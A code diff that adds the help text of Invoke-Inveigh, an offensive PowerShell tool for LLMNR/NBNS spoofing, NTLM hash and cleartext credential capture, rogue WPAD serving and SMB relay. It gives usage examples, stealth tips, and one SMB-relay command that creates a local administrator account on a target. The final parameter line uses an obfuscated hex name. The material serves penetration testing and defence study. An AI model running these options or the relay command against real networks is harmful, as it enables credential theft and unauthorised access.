@@ -1,5 +1,189 @@
 ﻿Function Invoke-Inveigh
 {
+
+<#
+.SYNOPSIS
+Invoke-Inveigh is a Windows PowerShell LLMNR/NBNS spoofer with challenge/response capture over HTTP/HTTPS/SMB.
+.DESCRIPTION
+Invoke-Inveigh is a Windows PowerShell LLMNR/NBNS spoofer with the following features:
+    IPv4 LLMNR/NBNS spoofer with granular control
+    NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS/SMB
+    Basic auth cleartext credential capture over HTTP/HTTPS
+    WPAD server capable of hosting a basic or custom wpad.dat file
+    HTTP/HTTPS server capable of hosting limited content
+    Granular control of console and file output
+    Run time control
+.PARAMETER IP
+Specify a specific local IP address for listening. This IP address will also be used for LLMNR/NBNS spoofing if
+the SpooferIP parameter is not set.
+.PARAMETER SpooferIP
+Specify an IP address for LLMNR/NBNS spoofing. This parameter is only necessary when redirecting victims to a
+system other than the Inveigh host.
+.PARAMETER SpooferHostsReply
+Default = All: Comma separated list of requested hostnames to respond to when spoofing with LLMNR and NBNS.
+.PARAMETER SpooferHostsIgnore
+Default = All: Comma separated list of requested hostnames to ignore when spoofing with LLMNR and NBNS.
+.PARAMETER SpooferIPsReply
+Default = All: Comma separated list of source IP addresses to respond to when spoofing with LLMNR and NBNS.
+.PARAMETER SpooferIPsIgnore
+Default = All: Comma separated list of source IP addresses to ignore when spoofing with LLMNR and NBNS.
+.PARAMETER SpooferRepeat
+Default = Enabled: (Y/N) Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user
+challenge/response has been captured.
+.PARAMETER LLMNR
+Default = Enabled: (Y/N) Enable/Disable LLMNR spoofing.
+.PARAMETER LLMNRTTL
+Default = 30 Seconds: Specify a custom LLMNR TTL in seconds for the response packet.
+.PARAMETER NBNS
+Default = Disabled: (Y/N) Enable/Disable NBNS spoofing.
+.PARAMETER NBNSTTL
+Default = 165 Seconds: Specify a custom NBNS TTL in seconds for the response packet.
+.PARAMETER NBNSTypes
+Default = 00,20: Comma separated list of NBNS types to spoof.
+Types include 00 = Workstation Service, 03 = Messenger Service, 20 = Server Service, 1B = Domain Name
+.PARAMETER HTTP
+Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.
+.PARAMETER HTTPS
+Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in
+the local store and attached to port 443. If the script does not exit gracefully, execute 
+"netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal"
+in the cert store.
+.PARAMETER HTTPAuth
+Default = NTLM: (Anonymous,Basic,NTLM) Specify the HTTP/HTTPS server authentication type. This setting does not
+apply to wpad.dat requests.
+.PARAMETER HTTPBasicRealm
+Specify a realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.
+.PARAMETER HTTPDir
+Specify a full directory path to enable hosting of basic content through the HTTP/HTTPS listener.
+.PARAMETER HTTPDefaultFile
+Specify a filename within the HTTPDir to serve as the default HTTP/HTTPS response file. This file will not be used
+for wpad.dat requests.
+.PARAMETER HTTPDefaultEXE
+Specify an EXE filename within the HTTPDir to serve as the default HTTP/HTTPS response for EXE requests. 
+.PARAMETER HTTPResponse
+Specify a string or HTML to serve as the default HTTP/HTTPS response. This response will not be used for wpad.dat
+requests. This parameter will not be used if HTTPDir is set. Use PowerShell character escapes where necessary. 
+.PARAMETER HTTPSCertAppID
+Specify a valid application GUID for use with the ceriticate.
+.PARAMETER HTTPSCertThumbprint
+Specify a certificate thumbprint for use with a custom certificate. The certificate filename must be located in
+the current working directory and named Inveigh.pfx.
+.PARAMETER WPADAuth
+Default = NTLM: (Anonymous,Basic,NTLM) Specify the HTTP/HTTPS server authentication type for wpad.dat requests.
+Setting to Anonymous can prevent browser login prompts.
+.PARAMETER WPADEmptyFile
+Default = Enabled: (Y/N) Enable/Disable serving a proxyless, all direct, wpad.dat file for wpad.dat requests.
+Enabling this setting can reduce the amount of redundant wpad.dat requests. This parameter is ignored when
+using WPADIP, WPADPort, or WPADResponse.
+.PARAMETER WPADIP
+Specify a proxy server IP to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter
+must be used with WPADPort.
+.PARAMETER WPADPort
+Specify a proxy server port to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter
+must be used with WPADIP.
+.PARAMETER WPADDirectHosts
+Comma separated list of hosts to list as direct in the wpad.dat file. Listed hosts will not be routed through the
+defined proxy.
+.PARAMETER WPADResponse
+Specify wpad.dat file contents to serve as the wpad.dat response. This parameter will not be used if WPADIP and
+WPADPort are set. Use PowerShell character escapes where necessary.
+.PARAMETER SMB
+Default = Enabled: (Y/N) Enable/Disable SMB challenge/response capture. Warning, LLMNR/NBNS spoofing can still
+direct targets to the host system's SMB server. Block TCP ports 445/139 or kill the SMB services if you need to
+prevent login requests from being processed by the Inveigh host.  
+.PARAMETER Challenge
+Default = Random: Specify a 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a
+random challenge will be generated for each request. This will only be used for non-relay captures.
+.PARAMETER MachineAccounts
+Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.
+.PARAMETER SMBRelay
+Default = Disabled: (Y/N) Enable/Disable SMB relay. Note that Inveigh-Relay.ps1 must be loaded into memory.
+.PARAMETER SMBRelayTarget
+IP address of system to target for SMB relay.
+.PARAMETER SMBRelayCommand
+Command to execute on SMB relay target.
+.PARAMETER SMBRelayUsernames
+Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and
+domain\username format. 
+.PARAMETER SMBRelayAutoDisable
+Default = Enable: (Y/N) Automaticaly disable SMB relay after a successful command execution on target.
+.PARAMETER SMBRelayNetworkTimeout
+Default = No Timeout: (Integer) Set the duration in seconds that Inveigh will wait for a reply from the SMB relay
+ target after each packet is sent.
+.PARAMETER ConsoleOutput
+Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to
+ensure that it doesn't hang the shell.
+.PARAMETER ConsoleStatus
+(Integer) Set interval in minutes for displaying all unique captured hashes and credentials. This is useful for
+displaying full capture lists when running through a shell that does not have access to the support functions.
+.PARAMETER ConsoleUnique
+Default = Enabled: (Y/N) Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname,
+and username combinations when real time console output is enabled.
+.PARAMETER FileOutput
+Default = Disabled: (Y/N) Enable/Disable real time file output.
+.PARAMETER FileUnique
+Default = Enabled: (Y/N) Enable/Disable outputting challenge/response hashes for only unique IP, domain/hostname,
+and username combinations when real time file output is enabled.
+.PARAMETER StatusOutput
+Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.
+.PARAMETER OutputStreamOnly
+Default = Disabled: (Y/N) Enable/Disable forcing all output to the standard output stream. This can be helpful if
+running Inveigh through a shell that does not return other output streams.Note that you will not see the various
+yellow warning messages if enabled.
+.PARAMETER OutputDir
+Default = Working Directory: Set a valid path to an output directory for log and capture files. FileOutput must
+also be enabled.
+.PARAMETER RunTime
+(Integer) Set the run time duration in minutes.
+.PARAMETER ShowHelp
+Default = Enabled: (Y/N) Enable/Disable the help messages at startup.
+.PARAMETER Inspect
+(Switch) Disable LLMNR, NBNS, HTTP, HTTPS, and SMB in order to only inspect LLMNR/NBNS traffic.
+.PARAMETER Tool
+Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's
+Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire   
+.EXAMPLE
+Import-Module .\Inveigh.psd1;Invoke-Inveigh
+Import full module and execute with all default settings.
+.EXAMPLE
+. ./Inveigh.ps1;Invoke-Inveigh -IP 192.168.1.10
+Dot source load and execute specifying a specific local listening/spoofing IP.
+.EXAMPLE
+Invoke-Inveigh -IP 192.168.1.10 -HTTP N
+Execute specifying a specific local listening/spoofing IP and disabling HTTP challenge/response.
+.EXAMPLE
+Invoke-Inveigh -SpooferRepeat N -WPADAuth Anonymous -SpooferHostsReply host1,host2 -SpooferIPsReply 192.168.2.75,192.168.2.76
+Execute with the stealthiest options.
+.EXAMPLE
+Invoke-Inveigh -Inspect
+Execute with LLMNR, NBNS, SMB, HTTP, and HTTPS disabled in order to only inpect LLMNR/NBNS traffic.
+.EXAMPLE
+Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N
+Execute specifying a specific local listening IP and a LLMNR/NBNS spoofing IP on another subnet. This may be
+useful for sending traffic to a controlled Linux system on another subnet.
+.EXAMPLE
+Invoke-Inveigh -HTTPResponse "<html><head><meta http-equiv='refresh' content='0; url=https://duckduckgo.com/'></head></html>"
+Execute specifying an HTTP redirect response.
+.EXAMPLE
+Invoke-Inveigh -SMBRelay y -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Spring2016 /add && net localgroup administrators Dave /add"
+Execute with SMB relay enabled with a command that will create a local administrator account on the SMB relay
+target.  
+.NOTES
+1. An elevated administrator or SYSTEM shell is needed.
+2. Currently supports IPv4 LLMNR/NBNS spoofing and HTTP/HTTPS/SMB NTLMv1/NTLMv2 challenge/response capture.
+3. LLMNR/NBNS spoofing is performed through sniffing and sending with raw sockets.
+4. SMB challenge/response captures are performed by sniffing over the host system's SMB service.
+5. HTTP challenge/response captures are performed with a dedicated listener.
+6. The local LLMNR/NBNS services do not need to be disabled on the host system.
+7. LLMNR/NBNS spoofer will point victims to host system's SMB service, keep account lockout scenarios in mind.
+8. Kerberos should downgrade for SMB authentication due to spoofed hostnames not being valid in DNS.
+9. Ensure that the LMMNR,NBNS,SMB,HTTP ports are open within any local firewall on the host system.
+10. If you copy/paste challenge/response captures from output window for password cracking, remove carriage returns.
+.LINK
+https://github.com/Kevin-Robertson/Inveigh
+#>
+
+
 param
 ( 
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${a9712376a14345acb0046b599ac35510}="Y",
